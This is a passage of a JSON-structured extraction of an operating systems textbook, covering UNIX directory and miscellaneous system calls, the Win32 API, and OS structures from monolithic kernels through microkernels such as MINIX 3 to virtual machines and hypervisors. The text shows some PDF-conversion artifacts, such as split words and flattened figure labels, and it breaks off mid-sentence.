            "content": "1.6.3 System Calls for Directory Management\r\nIn this section we will look at some system calls that relate more to directories\r\nor the file system as a whole, rather than just to one specific file as in the previous\r\nsection. The first two calls, mkdir and rmdir, create and remove empty directories,\r\nrespectively. The next call is link. Its purpose is to allow the same file to appear\r\nunder two or more names, often in different directories. A typical use is to allow\r\nseveral members of the same programming team to share a common file, with each\r\nof them having the file appear in his own directory, possibly under different names.\r\nSharing a file is not the same as giving every team member a private copy; having\n58 INTRODUCTION CHAP. 1\r\na shared file means that changes that any member of the team makes are instantly\r\nvisible to the other members—there is only one file. When copies are made of a\r\nfile, subsequent changes made to one copy do not affect the others.\r\nTo see how link works, consider the situation of Fig. 1-21(a). Here are two\r\nusers, ast and jim, each having his own directory with some files. If ast now ex\u0002ecutes a program containing the system call\r\nlink(\"/usr/jim/memo\", \"/usr/ast/note\");\r\nthe file memo in jim’s directory is now entered into ast’s directory under the name\r\nnote. Thereafter, /usr/jim/memo and /usr/ast/note refer to the same file. As an\r\naside, whether user directories are kept in /usr, /user, /home, or somewhere else is\r\nsimply a decision made by the local system administrator.\r\n/usr/ast /usr/jim\r\n16\r\n81\r\n40\r\nmail\r\ngames\r\ntest\r\n(a)\r\n31\r\n70\r\n59\r\n38\r\nbin\r\nmemo\r\nf.c.\r\nprog1\r\n/usr/ast /usr/jim\r\n16\r\n81\r\n40\r\n70\r\nmail\r\ngames\r\ntest\r\nnote\r\n(b)\r\n31\r\n70\r\n59\r\n38\r\nbin\r\nmemo\r\nf.c.\r\nprog1\r\nFigure 1-21. (a) Two directories before linking /usr/jim/memo to ast’s directory.\r\n(b) The same directories after linking.\r\nUnderstanding how link works will probably make it clearer what it does.\r\nEvery file in UNIX has a unique number, its i-number, that identifies it. This\r\ni-number is an index into a table of i-nodes, one per file, telling who owns the file,\r\nwhere its disk blocks are, and so on. A directory is simply a file containing a set of\r\n(i-number, ASCII name) pairs. In the first versions of UNIX, each directory entry\r\nwas 16 bytes—2 bytes for the i-number and 14 bytes for the name. Now a more\r\ncomplicated structure is needed to support long file names, but conceptually a di\u0002rectory is still a set of (i-number, ASCII name) pairs. In Fig. 1-21, mail has i-num\u0002ber 16, and so on. What link does is simply create a brand new directory entry with\r\na (possibly new) name, using the i-number of an existing file. In Fig. 1-21(b), two\r\nentries have the same i-number (70) and thus refer to the same file. If either one is\r\nlater removed, using the unlink system call, the other one remains. If both are re\u0002moved, UNIX sees that no entries to the file exist (a field in the i-node keeps track\r\nof the number of directory entries pointing to the file), so the file is removed from\r\nthe disk.\r\nAs we have mentioned earlier, the mount system call allows two file systems to\r\nbe merged into one. A common situation is to have the root file system, containing\r\nthe binary (executable) versions of the common commands and other heavily used\r\nfiles, on a hard disk (sub)partition and user files on another (sub)partition. Further,\r\nthe user can then insert a USB disk with files to be read.\nSEC. 1.6 SYSTEM CALLS 59\r\nBy executing the mount system call, the USB file system can be attached to the\r\nroot file system, as shown in Fig. 1-22. A typical statement in C to mount is\r\nmount(\"/dev/sdb0\", \"/mnt\", 0);\r\nwhere the first parameter is the name of a block special file for USB drive 0, the\r\nsecond parameter is the place in the tree where it is to be mounted, and the third\r\nparameter tells whether the file system is to be mounted read-write or read-only.\r\n(a) (b)\r\nbin dev lib mnt usr bin dev usr lib\r\nFigure 1-22. (a) File system before the mount. (b) File system after the mount.\r\nAfter the mount call, a file on drive 0 can be accessed by just using its path\r\nfrom the root directory or the working directory, without regard to which drive it is\r\non. In fact, second, third, and fourth drives can also be mounted anywhere in the\r\ntree. The mount call makes it possible to integrate removable media into a single\r\nintegrated file hierarchy, without having to worry about which device a file is on.\r\nAlthough this example involves CD-ROMs, portions of hard disks (often called\r\npartitions or minor devices) can also be mounted this way, as well as external\r\nhard disks and USB sticks. When a file system is no longer needed, it can be\r\nunmounted with the umount system call."
          },
          "1.6.4 Miscellaneous System Calls": {
            "page": 90,
            "content": "1.6.4 Miscellaneous System Calls\r\nA variety of other system calls exist as well. We will look at just four of them\r\nhere. The chdir call changes the current working directory. After the call\r\nchdir(\"/usr/ast/test\");\r\nan open on the file xyz will open /usr/ast/test/xyz. The concept of a working direc\u0002tory eliminates the need for typing (long) absolute path names all the time.\r\nIn UNIX every file has a mode used for protection. The mode includes the\r\nread-write-execute bits for the owner, group, and others. The chmod system call\r\nmakes it possible to change the mode of a file. For example, to make a file read\u0002only by everyone except the owner, one could execute\r\nchmod(\"file\", 0644);\r\nThe kill system call is the way users and user processes send signals. If a proc\u0002ess is prepared to catch a particular signal, then when it arrives, a signal handler is\n60 INTRODUCTION CHAP. 1\r\nrun. If the process is not prepared to handle a signal, then its arrival kills the proc\u0002ess (hence the name of the call).\r\nPOSIX defines a number of procedures for dealing with time. For example,\r\ntime just returns the current time in seconds, with 0 corresponding to Jan. 1, 1970\r\nat midnight (just as the day was starting, not ending). On computers using 32-bit\r\nwords, the maximum value time can return is 232 − 1 seconds (assuming an unsign\u0002ed integer is used). This value corresponds to a little over 136 years. Thus in the\r\nyear 2106, 32-bit UNIX systems will go berserk, not unlike the famous Y2K prob\u0002lem that would have wreaked havoc with the world’s computers in 2000, were it\r\nnot for the massive effort the IT industry put into fixing the problem. If you cur\u0002rently have a 32-bit UNIX system, you are advised to trade it in for a 64-bit one\r\nsometime before the year 2106."
          },
          "1.6.5 The Windows Win32 API": {
            "page": 91,
            "content": "1.6.5 The Windows Win32 API\r\nSo far we have focused primarily on UNIX. Now it is time to look briefly at\r\nWindows. Windows and UNIX differ in a fundamental way in their respective pro\u0002gramming models. A UNIX program consists of code that does something or\r\nother, making system calls to have certain services performed. In contrast, a Win\u0002dows program is normally event driven. The main program waits for some event to\r\nhappen, then calls a procedure to handle it. Typical events are keys being struck,\r\nthe mouse being moved, a mouse button being pushed, or a USB drive inserted.\r\nHandlers are then called to process the event, update the screen and update the in\u0002ternal program state. All in all, this leads to a somewhat different style of pro\u0002gramming than with UNIX, but since the focus of this book is on operating system\r\nfunction and structure, these different programming models will not concern us\r\nmuch more.\r\nOf course, Windows also has system calls. With UNIX, there is almost a one\u0002to-one relationship between the system calls (e.g., read) and the library procedures\r\n(e.g., read) used to invoke the system calls. In other words, for each system call,\r\nthere is roughly one library procedure that is called to invoke it, as indicated in\r\nFig. 1-17. Furthermore, POSIX has only about 100 procedure calls.\r\nWith Windows, the situation is radically different. To start with, the library\r\ncalls and the actual system calls are highly decoupled. Microsoft has defined a set\r\nof procedures called the Win32 API (Application Programming Interface) that\r\nprogrammers are expected to use to get operating system services. This interface is\r\n(partially) supported on all versions of Windows since Windows 95. By decou\u0002pling the API interface from the actual system calls, Microsoft retains the ability to\r\nchange the actual system calls in time (even from release to release) without invali\u0002dating existing programs. What actually constitutes Win32 is also slightly ambigu\u0002ous because recent versions of Windows have many new calls that were not previ\u0002ously available. In this section, Win32 means the interface supported by all ver\u0002sions of Windows. Win32 provides compatibility among versions of Windows.\nSEC. 1.6 SYSTEM CALLS 61\r\nThe number of Win32 API calls is extremely large, numbering in the thou\u0002sands. Furthermore, while many of them do invoke system calls, a substantial num\u0002ber are carried out entirely in user space. As a consequence, with Windows it is\r\nimpossible to see what is a system call (i.e., performed by the kernel) and what is\r\nsimply a user-space library call. In fact, what is a system call in one version of\r\nWindows may be done in user space in a different version, and vice versa. When\r\nwe discuss the Windows system calls in this book, we will use the Win32 proce\u0002dures (where appropriate) since Microsoft guarantees that these will be stable over\r\ntime. But it is worth remembering that not all of them are true system calls (i.e.,\r\ntraps to the kernel).\r\nThe Win32 API has a huge number of calls for managing windows, geometric\r\nfigures, text, fonts, scrollbars, dialog boxes, menus, and other features of the GUI.\r\nTo the extent that the graphics subsystem runs in the kernel (true on some versions\r\nof Windows but not on all), these are system calls; otherwise they are just library\r\ncalls. Should we discuss these calls in this book or not? Since they are not really\r\nrelated to the function of an operating system, we have decided not to, even though\r\nthey may be carried out by the kernel. Readers interested in the Win32 API should\r\nconsult one of the many books on the subject (e.g., Hart, 1997; Rector and New\u0002comer, 1997; and Simon, 1997).\r\nEven introducing all the Win32 API calls here is out of the question, so we will\r\nrestrict ourselves to those calls that roughly correspond to the functionality of the\r\nUNIX calls listed in Fig. 1-18. These are listed in Fig. 1-23.\r\nLet us now briefly go through the list of Fig. 1-23. CreateProcess creates a\r\nnew process. It does the combined work of fork and execve in UNIX. It has many\r\nparameters specifying the properties of the newly created process. Windows does\r\nnot have a process hierarchy as UNIX does so there is no concept of a parent proc\u0002ess and a child process. After a process is created, the creator and createe are\r\nequals. WaitForSingleObject is used to wait for an event. Many possible events can\r\nbe waited for. If the parameter specifies a process, then the caller waits for the\r\nspecified process to exit, which is done using ExitProcess.\r\nThe next six calls operate on files and are functionally similar to their UNIX\r\ncounterparts although they differ in the parameters and details. Still, files can be\r\nopened, closed, read, and written pretty much as in UNIX. The SetFilePointer and\r\nGetFileAttr ibutesEx calls set the file position and get some of the file attributes.\r\nWindows has directories and they are created with CreateDirector y and\r\nRemoveDirector y API calls, respectively. There is also a notion of a current direc\u0002tory, set by SetCurrentDirector y. The current time of day is acquired using GetLo\u0002calTime.\r\nThe Win32 interface does not have links to files, mounted file systems, securi\u0002ty, or signals, so the calls corresponding to the UNIX ones do not exist. Of course,\r\nWin32 has a huge number of other calls that UNIX does not have, especially for\r\nmanaging the GUI. Windows Vista has an elaborate security system and also sup\u0002ports file links. Windows 7 and 8 add yet more features and system calls.\n62 INTRODUCTION CHAP. 1\r\nUNIX Win32 Description\r\nfork CreateProcess Create a new process\r\nwaitpid WaitForSingleObject Can wait for a process to exit\r\nexecve (none) CreateProcess = for k + execve\r\nexit ExitProcess Terminate execution\r\nopen CreateFile Create a file or open an existing file\r\nclose CloseHandle Close a file\r\nread ReadFile Read data from a file\r\nwr ite Wr iteFile Wr ite data to a file\r\nlseek SetFilePointer Move the file pointer\r\nstat GetFileAttributesEx Get various file attributes\r\nmkdir CreateDirectory Create a new director y\r\nrmdir RemoveDirector y Remove an empty directory\r\nlink (none) Win32 does not support links\r\nunlink DeleteFile Destroy an existing file\r\nmount (none) Win32 does not support mount\r\numount (none) Win32 does not support mount, so no umount\r\nchdir SetCurrentDirectory Change the current wor king director y\r\nchmod (none) Win32 does not support secur ity (although NT does)\r\nkill (none) Win32 does not support signals\r\ntime GetLocalTime Get the current time\r\nFigure 1-23. The Win32 API calls that roughly correspond to the UNIX calls of\r\nFig. 1-18. It is worth emphasizing that Windows has a very large number of oth\u0002er system calls, most of which do not correspond to anything in UNIX.\r\nOne last note about Win32 is perhaps worth making. Win32 is not a terribly\r\nuniform or consistent interface. The main culprit here was the need to be back\u0002ward compatible with the previous 16-bit interface used in Windows 3.x."
          }
        }
      },
      "1.7 OPERATING SYSTEM STRUCTURE": {
        "page": 93,
        "children": {
          "1.7.1 Monolithic Systems": {
            "page": 94,
            "content": "1.7.1 Monolithic Systems\r\nBy far the most common organization, in the monolithic approach the entire\r\noperating system runs as a single program in kernel mode. The operating system is\r\nwritten as a collection of procedures, linked together into a single large executable\r\nbinary program. When this technique is used, each procedure in the system is free\r\nto call any other one, if the latter provides some useful computation that the former\r\nneeds. Being able to call any procedure you want is very efficient, but having thou\u0002sands of procedures that can call each other without restriction may also lead to a\r\nsystem that is unwieldy and difficult to understand. Also, a crash in any of these\r\nprocedures will take down the entire operating system.\r\nTo construct the actual object program of the operating system when this ap\u0002proach is used, one first compiles all the individual procedures (or the files con\u0002taining the procedures) and then binds them all together into a single executable\r\nfile using the system linker. In terms of information hiding, there is essentially\r\nnone—every procedure is visible to every other procedure (as opposed to a struc\u0002ture containing modules or packages, in which much of the information is hidden\r\naw ay inside modules, and only the officially designated entry points can be called\r\nfrom outside the module).\r\nEven in monolithic systems, however, it is possible to have some structure. The\r\nservices (system calls) provided by the operating system are requested by putting\r\nthe parameters in a well-defined place (e.g., on the stack) and then executing a trap\r\ninstruction. This instruction switches the machine from user mode to kernel mode\r\nand transfers control to the operating system, shown as step 6 in Fig. 1-17. The\r\noperating system then fetches the parameters and determines which system call is\r\nto be carried out. After that, it indexes into a table that contains in slot k a pointer\r\nto the procedure that carries out system call k (step 7 in Fig. 1-17).\r\nThis organization suggests a basic structure for the operating system:\r\n1. A main program that invokes the requested service procedure.\r\n2. A set of service procedures that carry out the system calls.\r\n3. A set of utility procedures that help the service procedures.\r\nIn this model, for each system call there is one service procedure that takes care of\r\nit and executes it. The utility procedures do things that are needed by several ser\u0002vice procedures, such as fetching data from user programs. This division of the\r\nprocedures into three layers is shown in Fig. 1-24.\r\nIn addition to the core operating system that is loaded when the computer is\r\nbooted, many operating systems support loadable extensions, such as I/O device\r\ndrivers and file systems. These components are loaded on demand. In UNIX they\r\nare called shared libraries. In Windows they are called DLLs (Dynamic-Link\r\nLibraries). They hav e file extension .dll and the C:\\Windows\\system32 directory\r\non Windows systems has well over 1000 of them.\n64 INTRODUCTION CHAP. 1\r\nMain\r\nprocedure\r\nService\r\nprocedures\r\nUtility\r\nprocedures\r\nFigure 1-24. A simple structuring model for a monolithic system."
          },
          "1.7.2 Layered Systems": {
            "page": 95,
            "content": "1.7.2 Layered Systems\r\nA generalization of the approach of Fig. 1-24 is to organize the operating sys\u0002tem as a hierarchy of layers, each one constructed upon the one below it. The first\r\nsystem constructed in this way was the THE system built at the Technische Hoge\u0002school Eindhoven in the Netherlands by E. W. Dijkstra (1968) and his students.\r\nThe THE system was a simple batch system for a Dutch computer, the Electrolog\u0002ica X8, which had 32K of 27-bit words (bits were expensive back then).\r\nThe system had six layers, as shown in Fig. 1-25. Layer 0 dealt with allocation\r\nof the processor, switching between processes when interrupts occurred or timers\r\nexpired. Above layer 0, the system consisted of sequential processes, each of\r\nwhich could be programmed without having to worry about the fact that multiple\r\nprocesses were running on a single processor. In other words, layer 0 provided the\r\nbasic multiprogramming of the CPU.\r\nLayer Function\r\n5 The operator\r\n4 User programs\r\n3 Input/output management\r\n2 Operator-process communication\r\n1 Memor y and drum management\r\n0 Processor allocation and multiprogramming\r\nFigure 1-25. Structure of the THE operating system.\r\nLayer 1 did the memory management. It allocated space for processes in main\r\nmemory and on a 512K word drum used for holding parts of processes (pages) for\r\nwhich there was no room in main memory. Above layer 1, processes did not have\r\nto worry about whether they were in memory or on the drum; the layer 1 software\nSEC. 1.7 OPERATING SYSTEM STRUCTURE 65\r\ntook care of making sure pages were brought into memory at the moment they\r\nwere needed and removed when they were not needed.\r\nLayer 2 handled communication between each process and the operator con\u0002sole (that is, the user). On top of this layer each process effectively had its own op\u0002erator console. Layer 3 took care of managing the I/O devices and buffering the\r\ninformation streams to and from them. Above layer 3 each process could deal with\r\nabstract I/O devices with nice properties, instead of real devices with many pecu\u0002liarities. Layer 4 was where the user programs were found. They did not have to\r\nworry about process, memory, console, or I/O management. The system operator\r\nprocess was located in layer 5.\r\nA further generalization of the layering concept was present in the MULTICS\r\nsystem. Instead of layers, MULTICS was described as having a series of concentric\r\nrings, with the inner ones being more privileged than the outer ones (which is ef\u0002fectively the same thing). When a procedure in an outer ring wanted to call a pro\u0002cedure in an inner ring, it had to make the equivalent of a system call, that is, a\r\nTRAP instruction whose parameters were carefully checked for validity before the\r\ncall was allowed to proceed. Although the entire operating system was part of the\r\naddress space of each user process in MULTICS, the hardware made it possible to\r\ndesignate individual procedures (memory segments, actually) as protected against\r\nreading, writing, or executing.\r\nWhereas the THE layering scheme was really only a design aid, because all the\r\nparts of the system were ultimately linked together into a single executable pro\u0002gram, in MULTICS, the ring mechanism was very much present at run time and\r\nenforced by the hardware. The advantage of the ring mechanism is that it can easi\u0002ly be extended to structure user subsystems. For example, a professor could write a\r\nprogram to test and grade student programs and run this program in ring n, with\r\nthe student programs running in ring n + 1 so that they could not change their\r\ngrades."
          },
          "1.7.3 Microkernels": {
            "page": 96,
            "content": "1.7.3 Microkernels\r\nWith the layered approach, the designers have a choice where to draw the ker\u0002nel-user boundary. Traditionally, all the layers went in the kernel, but that is not\r\nnecessary. In fact, a strong case can be made for putting as little as possible in ker\u0002nel mode because bugs in the kernel can bring down the system instantly. In con\u0002trast, user processes can be set up to have less power so that a bug there may not be\r\nfatal.\r\nVarious researchers have repeatedly studied the number of bugs per 1000 lines\r\nof code (e.g., Basilli and Perricone, 1984; and Ostrand and Weyuker, 2002). Bug\r\ndensity depends on module size, module age, and more, but a ballpark figure for\r\nserious industrial systems is between two and ten bugs per thousand lines of code.\r\nThis means that a monolithic operating system of fiv e million lines of code is like\u0002ly to contain between 10,000 and 50,000 kernel bugs. Not all of these are fatal, of\n66 INTRODUCTION CHAP. 1\r\ncourse, since some bugs may be things like issuing an incorrect error message in a\r\nsituation that rarely occurs. Nevertheless, operating systems are sufficiently buggy\r\nthat computer manufacturers put reset buttons on them (often on the front panel),\r\nsomething the manufacturers of TV sets, stereos, and cars do not do, despite the\r\nlarge amount of software in these devices.\r\nThe basic idea behind the microkernel design is to achieve high reliability by\r\nsplitting the operating system up into small, well-defined modules, only one of\r\nwhich—the microkernel—runs in kernel mode and the rest run as relatively power\u0002less ordinary user processes. In particular, by running each device driver and file\r\nsystem as a separate user process, a bug in one of these can crash that component,\r\nbut cannot crash the entire system. Thus a bug in the audio driver will cause the\r\nsound to be garbled or stop, but will not crash the computer. In contrast, in a\r\nmonolithic system with all the drivers in the kernel, a buggy audio driver can easily\r\nreference an invalid memory address and bring the system to a grinding halt in\u0002stantly.\r\nMany microkernels have been implemented and deployed for decades (Haertig\r\net al., 1997; Heiser et al., 2006; Herder et al., 2006; Hildebrand, 1992; Kirsch et\r\nal., 2005; Liedtke, 1993, 1995, 1996; Pike et al., 1992; and Zuberi et al., 1999).\r\nWith the exception of OS X, which is based on the Mach microkernel (Accetta et\r\nal., 1986), common desktop operating systems do not use microkernels. However,\r\nthey are dominant in real-time, industrial, avionics, and military applications that\r\nare mission critical and have very high reliability requirements. A few of the bet\u0002ter-known microkernels include Integrity, K42, L4, PikeOS, QNX, Symbian, and\r\nMINIX 3. We now giv e a brief overview of MINIX 3, which has taken the idea of\r\nmodularity to the limit, breaking most of the operating system up into a number of\r\nindependent user-mode processes. MINIX 3 is a POSIX-conformant, open source\r\nsystem freely available at www.minix3.org (Giuffrida et al., 2012; Giuffrida et al.,\r\n2013; Herder et al., 2006; Herder et al., 2009; and Hruby et al., 2013).\r\nThe MINIX 3 microkernel is only about 12,000 lines of C and some 1400 lines\r\nof assembler for very low-level functions such as catching interrupts and switching\r\nprocesses. The C code manages and schedules processes, handles interprocess\r\ncommunication (by passing messages between processes), and offers a set of about\r\n40 kernel calls to allow the rest of the operating system to do its work. These calls\r\nperform functions like hooking handlers to interrupts, moving data between ad\u0002dress spaces, and installing memory maps for new processes. The process structure\r\nof MINIX 3 is shown in Fig. 1-26, with the kernel call handlers labeled Sys. The\r\ndevice driver for the clock is also in the kernel because the scheduler interacts\r\nclosely with it. The other device drivers run as separate user processes.\r\nOutside the kernel, the system is structured as three layers of processes all run\u0002ning in user mode. The lowest layer contains the device drivers. Since they run in\r\nuser mode, they do not have physical access to the I/O port space and cannot issue\r\nI/O commands directly. Instead, to program an I/O device, the driver builds a struc\u0002ture telling which values to write to which I/O ports and makes a kernel call telling\nSEC. 1.7 OPERATING SYSTEM STRUCTURE 67\r\nUser\r\nmode\r\nMicrokernel handles interrupts, processes, \r\nscheduling, interprocess communication\r\nClock Sys\r\nFS Proc. Reinc. Other ... Servers\r\nDisk TTY Netw Print Other ... Drivers\r\nShell Make ...\r\nProcess\r\nOther User programs\r\nFigure 1-26. Simplified structure of the MINIX system.\r\nthe kernel to do the write. This approach means that the kernel can check to see\r\nthat the driver is writing (or reading) from I/O it is authorized to use. Consequently\r\n(and unlike a monolithic design), a buggy audio driver cannot accidentally write on\r\nthe disk.\r\nAbove the drivers is another user-mode layer containing the servers, which do\r\nmost of the work of the operating system. One or more file servers manage the file\r\nsystem(s), the process manager creates, destroys, and manages processes, and so\r\non. User programs obtain operating system services by sending short messages to\r\nthe servers asking for the POSIX system calls. For example, a process needing to\r\ndo a read sends a message to one of the file servers telling it what to read.\r\nOne interesting server is the reincarnation server, whose job is to check if the\r\nother servers and drivers are functioning correctly. In the event that a faulty one is\r\ndetected, it is automatically replaced without any user intervention. In this way,\r\nthe system is self healing and can achieve high reliability.\r\nThe system has many restrictions limiting the power of each process. As men\u0002tioned, drivers can touch only authorized I/O ports, but access to kernel calls is also\r\ncontrolled on a per-process basis, as is the ability to send messages to other proc\u0002esses. Processes can also grant limited permission for other processes to have the\r\nkernel access their address spaces. As an example, a file system can grant permis\u0002sion for the disk driver to let the kernel put a newly read-in disk block at a specific\r\naddress within the file system’s address space. The sum total of all these restric\u0002tions is that each driver and server has exactly the power to do its work and nothing\r\nmore, thus greatly limiting the damage a buggy component can do.\r\nAn idea somewhat related to having a minimal kernel is to put the mechanism\r\nfor doing something in the kernel but not the policy. To make this point better,\r\nconsider the scheduling of processes. A relatively simple scheduling algorithm is\r\nto assign a numerical priority to every process and then have the kernel run the\n68 INTRODUCTION CHAP. 1\r\nhighest-priority process that is runnable. The mechanism—in the kernel—is to\r\nlook for the highest-priority process and run it. The policy—assigning priorities to\r\nprocesses—can be done by user-mode processes. In this way, policy and mechan\u0002ism can be decoupled and the kernel can be made smaller."
          },
          "1.7.4 Client-Server Model": {
            "page": 99,
            "content": "1.7.4 Client-Server Model\r\nA slight variation of the microkernel idea is to distinguish two classes of proc\u0002esses, the servers, each of which provides some service, and the clients, which use\r\nthese services. This model is known as the client-server model. Often the lowest\r\nlayer is a microkernel, but that is not required. The essence is the presence of cli\u0002ent processes and server processes.\r\nCommunication between clients and servers is often by message passing. To\r\nobtain a service, a client process constructs a message saying what it wants and\r\nsends it to the appropriate service. The service then does the work and sends back\r\nthe answer. If the client and server happen to run on the same machine, certain\r\noptimizations are possible, but conceptually, we are still talking about message\r\npassing here.\r\nAn obvious generalization of this idea is to have the clients and servers run on\r\ndifferent computers, connected by a local or wide-area network, as depicted in\r\nFig. 1-27. Since clients communicate with servers by sending messages, the cli\u0002ents need not know whether the messages are handled locally on their own ma\u0002chines, or whether they are sent across a network to servers on a remote machine.\r\nAs far as the client is concerned, the same thing happens in both cases: requests are\r\nsent and replies come back. Thus the client-server model is an abstraction that can\r\nbe used for a single machine or for a network of machines.\r\nMachine 1 Machine 2 Machine 3 Machine 4\r\nClient\r\nKernel\r\nFile server\r\nKernel\r\nProcess server\r\nKernel\r\nTerminal server\r\nKernel\r\nMessage from\r\nclient to server\r\nNetwork\r\nFigure 1-27. The client-server model over a network.\r\nIncreasingly many systems involve users at their home PCs as clients and large\r\nmachines elsewhere running as servers. In fact, much of the Web operates this\r\nway. A PC sends a request for a Web page to the server and the Web page comes\r\nback. This is a typical use of the client-server model in a network.\nSEC. 1.7 OPERATING SYSTEM STRUCTURE 69"
          },
          "1.7.5 Virtual Machines": {
            "page": 100,
            "content": "1.7.5 Virtual Machines\r\nThe initial releases of OS/360 were strictly batch systems. Nevertheless, many\r\n360 users wanted to be able to work interactively at a terminal, so various groups,\r\nboth inside and outside IBM, decided to write timesharing systems for it. The of\u0002ficial IBM timesharing system, TSS/360, was delivered late, and when it finally ar\u0002rived it was so big and slow that few sites converted to it. It was eventually aban\u0002doned after its development had consumed some $50 million (Graham, 1970). But\r\na group at IBM’s Scientific Center in Cambridge, Massachusetts, produced a radi\u0002cally different system that IBM eventually accepted as a product. A linear descen\u0002dant of it, called z/VM, is now widely used on IBM’s current mainframes, the\r\nzSeries, which are heavily used in large corporate data centers, for example, as\r\ne-commerce servers that handle hundreds or thousands of transactions per second\r\nand use databases whose sizes run to millions of gigabytes.\r\nVM/370\r\nThis system, originally called CP/CMS and later renamed VM/370 (Seawright\r\nand MacKinnon, 1979), was based on an astute observation: a timesharing system\r\nprovides (1) multiprogramming and (2) an extended machine with a more con\u0002venient interface than the bare hardware. The essence of VM/370 is to completely\r\nseparate these two functions.\r\nThe heart of the system, known as the virtual machine monitor, runs on the\r\nbare hardware and does the multiprogramming, providing not one, but several vir\u0002tual machines to the next layer up, as shown in Fig. 1-28. However, unlike all\r\nother operating systems, these virtual machines are not extended machines, with\r\nfiles and other nice features. Instead, they are exact copies of the bare hardware, in\u0002cluding kernel/user mode, I/O, interrupts, and everything else the real machine has.\r\nI/O instructions here\r\nTrap here\r\nTrap here\r\nSystem calls here\r\nVirtual 370s\r\nCMS CMS CMS\r\nVM/370\r\n370 Bare hardware\r\nFigure 1-28. The structure of VM/370 with CMS.\r\nBecause each virtual machine is identical to the true hardware, each one can\r\nrun any operating system that will run directly on the bare hardware. Different vir\u0002tual machines can, and frequently do, run different operating systems. On the orig\u0002inal IBM VM/370 system, some ran OS/360 or one of the other large batch or\n70 INTRODUCTION CHAP. 1\r\ntransaction-processing operating systems, while others ran a single-user, interactive\r\nsystem called CMS (Conversational Monitor System) for interactive timesharing\r\nusers. The latter was popular with programmers.\r\nWhen a CMS program executed a system call, the call was trapped to the oper\u0002ating system in its own virtual machine, not to VM/370, just as it would be were it\r\nrunning on a real machine instead of a virtual one. CMS then issued the normal\r\nhardware I/O instructions for reading its virtual disk or whatever was needed to\r\ncarry out the call. These I/O instructions were trapped by VM/370, which then per\u0002formed them as part of its simulation of the real hardware. By completely separat\u0002ing the functions of multiprogramming and providing an extended machine, each\r\nof the pieces could be much simpler, more flexible, and much easier to maintain.\r\nIn its modern incarnation, z/VM is usually used to run multiple complete oper\u0002ating systems rather than stripped-down single-user systems like CMS. For ex\u0002ample, the zSeries is capable of running one or more Linux virtual machines along\r\nwith traditional IBM operating systems.\r\nVirtual Machines Rediscovered\r\nWhile IBM has had a virtual-machine product available for four decades, and a\r\nfew other companies, including Oracle and Hewlett-Packard, have recently added\r\nvirtual-machine support to their high-end enterprise servers, the idea of virtu\u0002alization has largely been ignored in the PC world until recently. But in the past\r\nfew years, a combination of new needs, new software, and new technologies have\r\ncombined to make it a hot topic.\r\nFirst the needs. Many companies have traditionally run their mail servers, Web\r\nservers, FTP servers, and other servers on separate computers, sometimes with dif\u0002ferent operating systems. They see virtualization as a way to run them all on the\r\nsame machine without having a crash of one server bring down the rest.\r\nVirtualization is also popular in the Web hosting world. Without virtualization,\r\nWeb hosting customers are forced to choose between shared hosting (which just\r\ngives them a login account on a Web server, but no control over the server soft\u0002ware) and dedicated hosting (which gives them their own machine, which is very\r\nflexible but not cost effective for small to medium Websites). When a Web hosting\r\ncompany offers virtual machines for rent, a single physical machine can run many\r\nvirtual machines, each of which appears to be a complete machine. Customers who\r\nrent a virtual machine can run whatever operating system and software they want\r\nto, but at a fraction of the cost of a dedicated server (because the same physical\r\nmachine supports many virtual machines at the same time).\r\nAnother use of virtualization is for end users who want to be able to run two or\r\nmore operating systems at the same time, say Windows and Linux, because some\r\nof their favorite application packages run on one and some run on the other. This\r\nsituation is illustrated in Fig. 1-29(a), where the term ‘‘virtual machine monitor’’\r\nhas been renamed type 1 hypervisor, which is commonly used nowadays because\nSEC. 1.7 OPERATING SYSTEM STRUCTURE 71\r\n‘‘virtual machine monitor’’ requires more keystrokes than people are prepared to\r\nput up with now. Note that many authors use the terms interchangeably though.\r\nType 1 hypervisor Host operating system\r\n(a) (b)\r\nWindows Linux ...\r\nExcel Word Mplayer Apollon\r\nMachine simulator \r\nGuest OS\r\nGuest\r\nHost OS\r\nprocess\r\nOS process\r\nHost operating system\r\n(c)\r\nType 2 hypervisor\r\nGuest OS\r\nGuest OS process\r\nKernel\r\nmodule\r\nFigure 1-29. (a) A type 1 hypervisor. (b) A pure type 2 hypervisor. (c) A practi\u0002cal type 2 hypervisor.\r\nWhile no one disputes the attractiveness of virtual machines today, the problem\r\nthen was implementation. In order to run virtual machine software on a computer,\r\nits CPU must be virtualizable (Popek and Goldberg, 1974). In a nutshell, here is\r\nthe problem. When an operating system running on a virtual machine (in user\r\nmode) executes a privileged instruction, such as modifying the PSW or doing I/O,\r\nit is essential that the hardware trap to the virtual-machine monitor so the instruc\u0002tion can be emulated in software. On some CPUs—notably the Pentium, its prede\u0002cessors, and its clones—attempts to execute privileged instructions in user mode\r\nare just ignored. This property made it impossible to have virtual machines on this\r\nhardware, which explains the lack of interest in the x86 world. Of course, there\r\nwere interpreters for the Pentium, such as Bochs, that ran on the Pentium, but with\r\na performance loss of one to two orders of magnitude, they were not useful for ser\u0002ious work.\r\nThis situation changed as a result of several academic research projects in the\r\n1990s and early years of this millennium, notably Disco at Stanford (Bugnion et\r\nal., 1997) and Xen at Cambridge University (Barham et al., 2003). These research\r\npapers led to several commercial products (e.g., VMware Workstation and Xen)\r\nand a revival of interest in virtual machines. Besides VMware and Xen, popular\r\nhypervisors today include KVM (for the Linux kernel), VirtualBox (by Oracle),\r\nand Hyper-V (by Microsoft).\r\nSome of these early research projects improved the performance over inter\u0002preters like Bochs by translating blocks of code on the fly, storing them in an inter\u0002nal cache, and then reusing them if they were executed again. This improved the\r\nperformance considerably, and led to what we will call machine simulators, as\r\nshown in Fig. 1-29(b). However, although this technique, known as binary trans\u0002lation, helped improve matters, the resulting systems, while good enough to pub\u0002lish papers about in academic conferences, were still not fast enough to use in\r\ncommercial environments where performance matters a lot.\n72 INTRODUCTION CHAP. 1\r\nThe next step in improving performance was to add a kernel module to do\r\nsome of the heavy lifting, as shown in Fig. 1-29(c). In practice now, all commer\u0002cially available hypervisors, such as VMware Workstation, use this hybrid strategy\r\n(and have many other improvements as well). They are called type 2 hypervisors\r\nby everyone, so we will (somewhat grudgingly) go along and use this name in the\r\nrest of this book, even though we would prefer to called them type 1.7 hypervisors\r\nto reflect the fact that they are not entirely user-mode programs. In Chap. 7, we\r\nwill describe in detail how VMware Workstation works and what the various\r\npieces do.\r\nIn practice, the real distinction between a type 1 hypervisor and a type 2 hyper\u0002visor is that a type 2 makes uses of a host operating system and its file system to\r\ncreate processes, store files, and so on. A type 1 hypervisor has no underlying sup\u0002port and must perform all these functions itself.\r\nAfter a 